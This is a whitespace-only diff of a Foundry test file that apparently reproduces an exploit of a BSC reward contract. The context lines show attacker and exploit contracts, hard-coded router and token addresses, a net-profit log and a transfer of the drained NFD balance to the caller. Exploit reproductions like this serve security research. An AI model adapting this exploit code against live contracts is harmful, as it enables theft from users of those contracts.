@@ -27,6 +27,7 @@ CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12
 address constant vulnContract = 0x8B068E22E9a4A9bcA3C321e0ec428AbF32691D1E;
 
 contract Attacker is Test {
+
     IPancakeRouter constant PancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
     address constant wbnb = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
     address constant dodo = 0xD534fAE679f7F02364D177E9D44F1D15963c0Dd7;
@@ -91,9 +92,11 @@ contract Attacker is Test {
 
         emit log_named_decimal_uint("Attacker's Net Profit", IERC20(wbnb).balanceOf(address(this)), 18);
     }
+
 }
 
 contract Exploit is Test {
+
     address constant rewardContract = vulnContract;
     address constant nfd = 0x38C63A5D3f206314107A7a9FE8cBBa29D629D4F9;
 
@@ -103,6 +106,7 @@ contract Exploit is Test {
         uint256 bal = IERC20(nfd).balanceOf(address(this));
         require(IERC20(nfd).transfer(msg.sender, bal), "Transfer profit failed");
     }
+
 }
 
 /* -------------------- Decompiled Vulnerable Contract 0x8b068e22e9a4a9bca3c321e0ec428abf32691d1e -------------------- */
